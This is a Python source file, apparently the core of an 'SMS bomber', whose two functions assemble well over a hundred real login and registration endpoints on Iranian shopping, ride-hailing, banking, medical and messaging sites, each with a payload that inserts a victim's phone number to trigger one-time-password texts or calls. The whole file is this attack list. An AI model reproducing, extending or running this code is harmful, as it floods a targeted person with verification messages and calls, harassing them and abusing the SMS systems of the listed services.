def send_otp_requests(number):
    url_payload_map = {
        'komodaa': ('https://api.komodaa.com/api/v2.6/loginRC/request', {"phone_number": '0' + number}),
        'janebi': ('https://janebi.com/signin?do', {'resend': '0' + number}),
        '4hair': ('https://4hair.ir/user/login.php', {'num': '0' + number, 'ok': ''}),
        'igame': ('https://igame.ir/api/play/otp/send', {'phone': '0' + number}),
        'karlancer': ('https://www.karlancer.com/api/register', {"phone": number, "role": "freelancer"}),
        'hsaria': ('https://www.hsaria.com/MemberRegisterLogin', {"phone": number}),
        'twsms': ('https://twsms.ir/client/register.php', {'mobile': '0' + number, 'agree': 'agree', 'sendsms': '1'}),
        'baradarantoy': ('https://baradarantoy.ir/send_confirm_sms_ajax.php', {'user_tel': '0' + number}),
        'kavirmotor': ('https://kavirmotor.com/sms/send', {'phoneNumber': '0' + number}),
        'chechilas': ('https://chechilas.com/user/login', {'mob': '0' + number}),
        'chechilas': ('https://searchii.ir//controler//phone_otp.php',
                      {'mobile_number': '0' + number, 'action': 'send_otp', 'login': 'user'}),
        'badparak': ('https://badparak.com/register/request_verification_code', {'mobile': '0' + number}),
        'hermeskala': ('https://hermeskala.com//login/send_vcode', {'mobile_number': '0' + number}),
        'elinorboutique': ('https://api.elinorboutique.com/v1/customer/register-login', {'mobile': '0' + number}),
        'atlasmode': ('https://api.atlasmode.ir/v1/customer/register-login?version=new2', {'mobile': '0' + number}),
        'pooshakshoniz': ('https://api.pooshakshoniz.com/v1/customer/register-login?version=new1',
                          {'mobile': '0' + number}),
        'ubike': ('https://ubike.ir/index.php?route=extension/module/websky_otp/send_code',
                  {'telephone': '0' + number}),
        'benedito': ('https://api.benedito.ir/v1/customer/register-login?version=new1', {'mobile': '0' + number}),
        'rubeston': ('https://www.rubeston.com/api/customers/login-register', {'mobile': '0' + number, 'step': '1'}),
        'primashop': ('https://primashop.ir/index.php?route=extension/module/websky_otp/send_code',
                      {'telephone': '0' + number}),
        'payagym': ('https://payagym.com/wp-admin/admin-ajax.php',
                    {'mobile': '0' + number, 'action': 'kerasno_proform_register_inline_send'}),
        'bartarinha': ('https://bartarinha.com/Advertisement/Users/RequestLoginMobile',
                       {'mobileNo': '0' + number, 'X-Requested-With': 'XMLHttpRequest'}),
        'manoshahr': ('https://manoshahr.ir/jq.php',
                      {'mobile': '0' + number, 'class_name': 'public_login', 'function_name': 'sendCode'}),
        'nalinoco': ('https://www.nalinoco.com/api/customers/login-register',
                     {'mobile': '0' + number, 'ReturnUrl': '/', 'step': '1'}),
        'hiss': ('https://hiss.ir/wp-admin/admin-ajax.php',
                 {'phone_email': '0' + number, 'action': 'bakala_send_code'}),
        'tahrir-online': ('https://tahrir-online.ir/wp-admin/admin-ajax.php',
                          {'phone': '+98' + number, 'form': 'register', 'action': 'mobix_send_otp_code'}),
        'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': '0' + number}),
        'martday': ('https://martday.ir/api/customer/member/register/', {'email': '0' + number, 'accept_term': 'on'}),
        'paaakar': ('https://api.paaakar.com/v1/customer/register-login?version=new1', {'mobile': '0' + number}),
        'electrastore': ('https://electrastore.ir/index.php?route=extension/module/websky_otp/send_code',
                         {'telephone': '0' + number}),
        'atrinelec': ('https://www.atrinelec.com/ajax/SendSmsVerfiyCode', {'mobile': '0' + number}),
        'ketabweb': ('https://ketabweb.com/login/?usernameCheck=1', {'username': '0' + number}),
        'dastaneman': ('https://dastaneman.com/User/SendCode', {'mobile': '0098' + number}),
        '80w': ('https://80w.ir/wp-admin/admin-ajax.php', {'login': '0' + number, 'action': 'logini_first'}),
        'noavarpub': ('https://noavarpub.com/logins/login.php?ref=https%3A%2F%2Fnoavarpub.com%2F',
                      {'phone': '0' + number, 'submit': '123'}),
        'hovalvakil': ('https://api.hovalvakil.com/api/User/SendConfirmCode?userName=' + number + '', None),
        'digighate': ('https://api.digighate.com/v2/public/code?phone=' + number + '', None),
        'azarbadbook': ('https://azarbadbook.ir/ajax/login_j_ajax_ver/', {'phone': number}),
        'kanoonbook': ('https://www.kanoonbook.ir/store/customer_otp',
                       {'customer_username': number, 'task': 'customer_phone'}),
        'cheshmandazketab': ('https://www.cheshmandazketab.ir/Register', {'phone': '0' + number, 'login': '1'}),
        'ketabir': ('https://sso-service.ketab.ir/api/v2/signup/otp?Mobile=0' + number + '&OtpSmsType=1', None),
        'snappshop': ('https://apix.snappshop.co/auth/v1/pre-login?lat=35.77331&lng=51.418591',
                      {'mobile': '0' + number}),
        'ketabium': ('https://www.ketabium.com/login-register', {'username': '0' + number}),
        'rirabook': ('https://rirabook.com/loginAth', {'mobile1': '0' + number, 'loginbt1': ''}),
        'pashikshoes': ('https://api.pashikshoes.com/v1/customer/register-login', {'mobile': '0' + number}),
        'shimashoes': ('https://shimashoes.com/api/customer/member/register/', {'email': '0' + number}),
        'lendo': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': '0' + number}),
        'buskool': ('https://www.buskool.com/send_verification_code', {'phone': '0' + number}),
        'tamimpishro': ('https://www.tamimpishro.com/site/api/v1/user/otp', {'mobile': '0' + number}),
        'fafait': ('https://api2.fafait.net/oauth/check-user', {'id': '0' + number}),
        'sheypoor': ('https://www.sheypoor.com/api/v10.0.0/auth/send', {'username': '0' + number}),
        'itoll': ('https://app.itoll.com/api/v1/auth/login', {'mobile': '0' + number}),
        'banimode': ('https://mobapi.banimode.com/api/v2/auth/request', {'phone': '0' + number}),
        'torob': ('https://api.torob.com/v4/user/phone/send-pin', {'phone_number': '0' + number}),
        'basalam': ('https://auth.basalam.com/otp-request', {'mobile': '0' + number}),
        'khanoumi': ('https://www.khanoumi.com/accounts/sendotp', {'mobile': '0' + number, 'redirectUrl': ''}),
        'fankala': ('https://fankala.com/wp-admin/admin-ajax.php',
                    {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''}),
        'arastag': ('https://arastag.ir/wp-admin/admin-ajax.php',
                    {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''}),
        'drdr': ('https://drdr.ir/api/registerEnrollment/verifyMobile',
                 {'phoneNumber': '0' + number, 'userType': 'PATIENT'}),
        'telewebion': ('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one',
                       {'code': '98', 'phone': number, 'smsStatus': 'default'}),
        'gap': ('https://core.gap.im/v1/user/add.json', {'mobile': '+98' + number}),
        'caropex': ('https://caropex.com/api/v1/user/login', {'mobile': '0' + number}),
        'namava': ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request',
                   {'UserName': '+98' + number}),
        'snappapps': ('https://api.snapp.ir/api/v1/sms/link', {'phone': '0' + number}),
        'novinmedical': ('https://novinmedical.com/wp-admin/admin-ajax.php',
                         {'action': 'stm_login_register', 'type': 'mobile', 'input': '0' + number}),
        'hamrahsport': ('https://hamrahsport.com/send-otp',
                        {'cell': number, 'name': 'persian_string', 'agree': '1', 'send_otp': '1', 'otp': ''}),
        'harikashop': ('https://harikashop.com/login?back=my-account', {
            'username': '0' + number,
            'id_customer': '',
            'back': ['', 'https://harikashop.com/login?back=my-account'],
            'firstname': 'persian_string',
            'lastname': 'persian_string',
            'password': 'random_password',
            'action': 'register',
            'ajax': '1'
        }),
        'zzzagros': ('https://www.zzzagros.com/wp-admin/admin-ajax.php', {
            'action': 'ywp_ajax_register',
            'ywp_register': '1',
            'ywp_reg_mobile': '0' + number,
            'ywp_reg_password': 'random_password',
            'ajax_woocommerce_register_nonce': ''
        }),
        'dalfak': ('https://www.dalfak.com/api/auth/sendVerificationCode', {
            'type': 1,
            'value': '0' + number
        }),
        'doctoreto': ('https://api.doctoreto.com/api/web/patient/v1/accounts/register', {
            'country_id': 205,
            'mobile': number
        }),
        'digikalacall': ('https://api.digikala.com/v1/user/authenticate/', {
            'backUrl': '/',
            'username': '0' + number,
            'otp_call': 'true'
        }),
        'okala': ('https://api-react.okala.com/C/CustomerAccount/OTPRegister', {
            'mobile': '0' + number,
            'deviceTypeCode': 0,
            'confirmTerms': 'true',
            'notRobot': 'false',
        }),
        'digikala': ('https://api.digikala.com/v1/user/authenticate/', {
            'backUrl': '/',
            'username': '0' + number,
            'otp_call': 'false'
        }),
        'novinmedical': ('https://novinmedical.com/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input': '0' + number
        }),
        'mellishoes': ('https://mellishoes.ir/wp-admin/admin-ajax.php', {
            'action': 'websima_auth_account_detection',
            'account_detection_nonce_field': '21737b7e2d',
            'mobile': '0' + number,
            '_wp_http_referer': '/'
        }),
        'setshoe': ('https://setshoe.ir/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input': '0' + number,
        }),
        'maxbax': ('https://maxbax.com/wp-admin/admin-ajax.php', {
            'action': 'bakala_send_code',
            'phone_email': '0' + number,
        }),
        'shikstyle': ('https://shik.style/wp-admin/admin-ajax.php', {
            'action': 'login',
            'form=phone': number,
        }),
        'parkbag': ('https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber', {
            'ReturnUrl': 'https://parkbag.com/',
            'MobaileNumber': number,
        }),
        'digistyle': ('https://www.digistyle.com/users/login-register/', {
            'loginRegister[email_phone]': '0' + number,
        }),
        'telketab': ('https://telketab.com/opt_field/check_secret', {
            'identity': '0' + number,
            'secret': '',
            'plugin': 'otp_field_sms_processor',
            'key': 'otp_field_user_auth_form__otp_sms',
        }),
        'adinehbook': ('https://www.adinehbook.com/gp/flex/sign-in.html', {
            'action': 'sign',
            'phone_cell_or_email': '0' + number,
        }),
        'gitamehr': ('https://gitamehr.ir/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input': '0' + number,
        }),
        'sunnybook': ('https://sunnybook.ir/Home/RegisterUser', {
            'name': 'Mr',
            'password': '123456',
            'mobile': number,
        }),
        'mahouney': ('https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber', {
            'ReturnUrl': 'https://mahouney.com/',
            'MobaileNumber': '0' + number,
        }),
        'myroz': ('https://myroz.ir/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input': '0' + number,
        }),
        'meidane': ('https://meidane.com/accounts/login', {
            'name': 'Mr',
            'password': '123456',
            'mobile': number,
        }),
        'ickala': ('https://ickala.com/', {
            'controller': 'SendSMS', 'fc': 'module',
            'module': 'loginbymobile', 'SubmitSmsSend': '1',
            'ajax': 'true',
            'otp_mobile_num': '0' + number
        }),
        'microele': ('https://www.microele.com/login?back=my-account', {
            'id_customer': '', 'back': ',my-account',
            'firstname': '123', 'lastname': '123',
            'password': '123456', 'action': 'register',
            'username': '0' + number, 'ajax': '1'
        }),
        'elecmarket': ('https://elecmarket.ir/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register', 'type': 'mobile',
            'input': '0' + number
        }),
        'techsiro': ('https://techsiro.com/send-otp', {
            'client': 'web', 'method': 'POST', '_token': '',
            'mobile': '0' + number
        }),
        'noavarpub': ('https://novinparse.com/Page/PageAction.aspx', {
            'Action': 'SendVerifyCode', 'verifyCode': '', 'repeatFlag': 'true',
            'mobile': '0' + number
        }),
        'titomarket': ('https://titomarket.com/index.php?route=account/login_verify/verify', {
            'redirect': 'https://titomarket.com/my-account',
            'telephone': '0' + number
        }),
        'nikanbike': (f'https://nikanbike.com/?rand={number}', {
            'controller': 'authentication', 'back': 'my-account', 'fc': 'module',
            'ajax': 'true', 'module': 'iverify',
            'phone_mobile': '0' + number, 'SubmitCheck': ''
        }),
        'account724': ('https://account724.com/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input': '0' + number
        }),

        'alopeyk': ('https://api.alopeyk.com/api/v2/login', {
            'type': 'CUSTOMER',
            'model': 'Chrome',
            'platform': 'pwa',
            'version': '10',
            'phone': '0' + number
        }),
        'tapsi': ('https://tap33.me/api/v2/user', {
            'credential': {
                'phoneNumber': '0' + number,
                'role': 'PASSENGER'
            }
        }),
        'mrbilit': ('https://auth.mrbilit.com/api/login/exists/v2', {
            'mobileOrEmail': '0' + number,
            'source': 2,
            'sendTokenIfNot': 'true'
        }),
        'alibaba': ('https://ws.alibaba.ir/api/v3/account/mobile/otp', {
            'phoneNumber': '0' + number
        }),
        'trip': ('https://gateway.trip.ir/api/registers', {
            'CellPhone': '0' + number
        }),

        'snappfood': ('https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass', {
            'cellphone': '0' + number,
            'optionalClient': 'WEBSITE',
            'client': 'WEBSITE',
            'deviceType': 'WEBSITE'
        }),
        'snappmarket': ('https://api.snapp.market/mart/v1/user/loginMobileWithNoPass', {
            'cellphone': '0' + number
        }),
        'snappexpress': ('https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass', {
            'cellphone': '0' + number,
            'client': 'PWA',
            'optionalClient': 'PWA',
            'deviceType': 'PWA'
        }),
        'delino': ('https://www.delino.com/user/register', {
            'mobile': '0' + number
        }),

        'digikala_alt': ('https://api.digikala.com/v1/user/authenticate', {
            'username': '0' + number
        }),
        'timcheh': ('https://api.timcheh.com/auth/otp/send', {
            'mobile': '0' + number
        }),
        'bama': ('https://bama.ir/signin-checkforcellnumber', {
            'cellNumber': '0' + number
        }),
        'divar': ('https://api.divar.ir/v5/auth/authenticate', {
            'phone': number
        }),
        'sheypoor_alt': ('https://www.sheypoor.com/auth', {
            'username': '0' + number
        }),
        'torob_alt': ('https://api.torob.com/a/phone/send-pin', {
            'phone_number': '0' + number
        }),

        'rubika': ('https://messengerg2c4.iranlms.ir/', {
            'api_version': '3',
            'method': 'sendCode',
            'data': {
                'phone_number': number,
                'send_type': 'SMS'
            }
        }),
        'shad': ('https://shadmessenger12.iranlms.ir/', {
            'api_version': '3',
            'method': 'sendCode',
            'data': {
                'phone_number': number,
                'send_type': 'SMS'
            }
        }),
        'gap_im': ('https://core.gap.im/v1/user/add.json', {
            'mobile': '+98' + number
        }),
        'instagram': ('https://www.instagram.com/accounts/account_recovery_send_ajax/', {
            'email_or_username': '+98' + number,
            'recaptcha_challenge_field': '',
            'flow': ''
        }),

        'digipay': ('https://app.mydigipay.com/digipay/api/users/send-sms', {
            'cellNumber': '0' + number,
            'device': {
                'deviceId': 'a16e6255-17c3-431b-b047-3f66d24c286f',
                'deviceModel': 'WEB_BROWSER',
                'deviceAPI': 'WEB_BROWSER',
                'osName': 'WEB'
            }
        }),
        'lendo_alt': ('https://api.lendo.ir/api/customer/auth/send-otp', {
            'mobile': '0' + number
        }),
        'bitbarg': ('https://api.bitbarg.com/api/v1/authentication/registerOrLogin', {
            'phone': '0' + number
        }),
        'bitpin': ('https://api.bitpin.ir/v1/usr/sub_phone', {
            'phone': '0' + number,
            'captcha_token': ''
        }),
        'bit24': ('https://api.bit24.cash/api/v3/auth/check-mobile', {
            'mobile': '0' + number
        }),
        'raybit': ('https://api.raybit.net:3111/api/v1/authentication/register/mobile', {
            'mobile': '+98' + number,
            'side': 'web'
        }),

        'filmnet': ('https://api-v2.filmnet.ir/access-token/users/{}/otp'.format('0' + number), None),
        'namava_alt': ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', {
            'UserName': '0' + number
        }),
        'virgool': ('https://virgool.io/api/v1.4/auth/verify', {
            'method': 'phone',
            'identifier': '0' + number
        }),
        'anargift': ('https://api.anargift.com/api/people/auth', {
            'user': '0' + number,
            'app_id': 99
        }),
        'gapfilm': ('https://core.gapfilm.ir/api/v3.1/Account/Login', {
            'Type': 3,
            'Username': number,
            'SourceChannel': 'GF_WebSite'
        }),

        'pezeshket': ('https://api.pezeshket.com/core/v1/auth/requestCode', {
            'mobileNumber': '0' + number
        }),
        'nobat': ('https://nobat.ir/api/public/patient/login/phone', {
            'mobile': '0' + number
        }),
        'doctor': ('https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{}/sms'.format(number), None),
        'drdr_alt': ('https://drdr.ir/api/registerEnrollment/sendDisposableCode', {
            'phoneNumber': '0' + number,
            'userType': 'PATIENT'
        }),

        'kilid': ('https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start', {
            'mobile': '0' + number,
            'realm': 'PORTAL'
        }),
        'divar_estate': ('https://api.divar.ir/v5/auth/authenticate', {
            'phone': number
        }),

        'classino': ('https://nx.classino.com/otp/v1/api/login', {
            'mobile': '0' + number
        }),
        'chamedoon': ('https://chamedoon.com/api/v1/membership/guest/request_mobile_verification', {
            'mobile': '0' + number,
            'origin': '/',
            'referrer_id': None
        }),

        'mci': ('https://api-ebcom.mci.ir/services/auth/v1.0/otp', {
            'msisdn': number
        }),
        'mci_shop': ('https://api-ebcom.mci.ir/services/auth/v1.0/otp', {
            'msisdn': number
        }),

        'khodro45': ('https://khodro45.com/api/v1/customers/otp', {
            'mobile': '0' + number
        }),
        'mashinbank': ('https://mashinbank.com/api2/users/check', {
            'mobileNumber': '0' + number
        }),

        'flightio': ('https://app.flightio.com/bff/Authentication/CheckUserKey', {
            'userKey': '98-' + number,
            'userKeyType': 1
        }),
        'sTrip': ('https://www.snapptrip.com/register', {
            'mobile_phone': '0' + number,
            'country_code': '+98',
            'lang': 'fa'
        }),
        'arka': ('https://api.chartex.net/api/v2/user/validate', {
            'mobile': '0' + number,
            'country_code': 'IR',
            'provider_code': 'RUBIKA'
        }),

        'azki': ('https://www.azki.com/api/core/app/user/checkLoginAvailability', {
            'phoneNumber': 'azki_0' + number
        }),
        'achar': ('https://api.achareh.ir/v2/accounts/login', {
            'phone': '0' + number,
            'utm_source': 'null'
        }),
        'bimito': ('https://bimito.com/api/core/app/user/checkLoginAvailability', {
            'phoneNumber': '0' + number
        }),

        'digify': ('https://apollo.digify.shop/graphql', {
            'operationName': 'Mutation',
            'variables': {
                'content': {
                    'phone_number': '0' + number
                }
            },
            'query': '''mutation Mutation($content: MerchantRegisterOTPSendContent) {
                merchantRegister {
                    otpSend(content: $content)
                    __typename
                }
            }'''
        }),
        'pinket': ('https://pinket.com/api/cu/v2/phone-verification', {
            'phoneNumber': '0' + number
        }),
        'otaghak': ('https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode', {
            'userName': '0' + number
        }),
        'shab': ('https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile', {
            'mobile': '0' + number,
            'country_code': '+98'
        }),
    }
    return list(url_payload_map.values())


def send_otp_requests_json(number):
    url2_payload2_map = {
        'eaccount': ('https://eaccount.ir/api/v1/sessions/login_request', {"mobile_phone": "0" + number + ""}),
        'queenaccessories': ('https://queenaccessories.ir/api/v1/sessions/login_request',
                             {"mobile_phone": "0" + number + ""}),
        'rastaraccessory': ('https://rastaraccessory.ir/api/v1/sessions/login_request',
                            {"mobile_phone": "0" + number + ""}),
        'vinaaccessory': ('https://vinaaccessory.com/api/v1/sessions/login_request',
                          {"mobile_phone": "0" + number + ""}),
        'chortkehshop': ('https://chortkehshop.ir/api/v1/sessions/login_request', {"mobile_phone": "0" + number + ""}),
        'piinkstore': ('https://piinkstore.ir/api/v1/sessions/login_request', {"mobile_phone": "0" + number + ""}),
        'dreamlandshop': ('https://dreamlandshop.ir/api/v1/sessions/login_request',
                          {"mobile_phone": "0" + number + ""}),

        'deniizshop': ('https://deniizshop.com/api/v1/sessions/login_request', {"mobile_phone": "0" + number}),
        'farvi': ('https://farvi.shop/api/v1/sessions/login_request', {"mobile_phone": "0" + number}),
        'takshopaccessorise': ('https://takshopaccessorise.ir/api/v1/sessions/login_request',
                               {"mobile_phone": "0" + number}),
        'tex3': ('https://3tex.io/api/1/users/validation/mobile', {"receptorPhone": "0" + number}),
        'behtarino': ('https://bck.behtarino.com/api/v1/users/phone_verification/', {"phone": "0" + number}),
        'abantether': ('https://abantether.com/users/register/phone/send/', {
            "phoneNumber": "0" + number,
            "email": ""
        }),
        'pooleno': ('https://api.pooleno.ir/v1/auth/check-mobile', {"mobile": "0" + number}),
        'wide': ('https://agent.wide-app.ir/auth/token', {
            "grant_type": "otp",
            "client_id": "62b30c4af53e3b0cf100a4a0",
            "phone": "0" + number
        }),
        'arzinja': ('https://arzinja.app/api/login', {
            "boundary": "----WebKitFormBoundarycIO8Y5lNAbbiVXKS",
            "mobile": "0" + number
        }),
        'emtiaz': ('https://web.emtiyaz.app/json/login', "send=1&cellphone=0" + number),
        'digify_json': ('https://apollo.digify.shop/graphql', {
            "operationName": "Mutation",
            "variables": {
                "content": {
                    "phone_number": "0" + number
                }
            },
            "query": """mutation Mutation($content: MerchantRegisterOTPSendContent) {
                merchantRegister {
                    otpSend(content: $content)
                    __typename
                }
            }"""
        }),
    }


    return list(url2_payload2_map.values())
